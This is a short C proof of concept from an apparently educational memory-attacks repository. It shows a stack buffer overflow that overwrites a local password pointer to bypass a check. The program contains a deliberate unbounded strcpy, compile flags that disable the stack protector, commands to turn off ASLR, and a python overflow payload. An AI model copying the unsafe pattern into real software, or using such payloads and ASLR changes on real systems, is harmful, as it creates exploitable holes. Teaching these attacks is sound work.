/*
 * Filename: 2_localvaroverwrite.c
 * Author: @charlieMKR, https://makemyday.io
 *
 * The goal of this code is to ilustrate how local vars can be overwritten through buffer overflow.
 *
 * Compile with: gcc -O0 -m32 -fno-stack-protector -ggdb -o localvaroverwrite.o 2_localvaroverwrite.c
 *
 * IMPORTANT: YOU WILL NEED TO DISABLE ASLR FOR THIS PoC TO WORK.
 * PLEASE REMEMBER TO ENABLE IT AGAIN AFTER TESTING
 * - DISABLE: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 * - ENABLE: echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
 *
 * This code is part of the Memory Attacks repository at https://github.com/charlieMKR/memory-attacks
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>


char *answer(char *charArray) {
	char *HARDCODEDPASS = "Whatever\n"; // Address will be stored in the stack
	char overflowable[10]; // buffer that will be overflowed
	strcpy(overflowable, charArray); // HARDCODEDPASS address overwrite
	if(strcmp(overflowable,HARDCODEDPASS) == 0){
		return "The answer is 42";
	} else {
		return "Sorry, wrong password!";
	}

}

int main(){
	char password[30];
	sleep(5); // Give time for gdb to attach: sudo gdb -p $(pgrep localvarover)
	printf("Enter the password to unlock the answer to life, the universe and everything: ");
	/* Steps:
	 * 1. Use "AAAAAAAAAA" input and examine the stack with GDB
	 * 2. Get the stack address of overflowable local
	 * 3. Run again and use echo $(python -c 'print("\x41"*10 + "\x92\xd0\xff\xff")') | ./localvaroverwrite.o
	 * where the last 4 bytes of your input are the address of overflowable local in the stack.
	 * 4. Enjoy the answer of life
	*/
	fgets(password, 30, stdin);
	printf("\n%s\n", answer(password));
	printf("Exiting!");
	return 0;
}

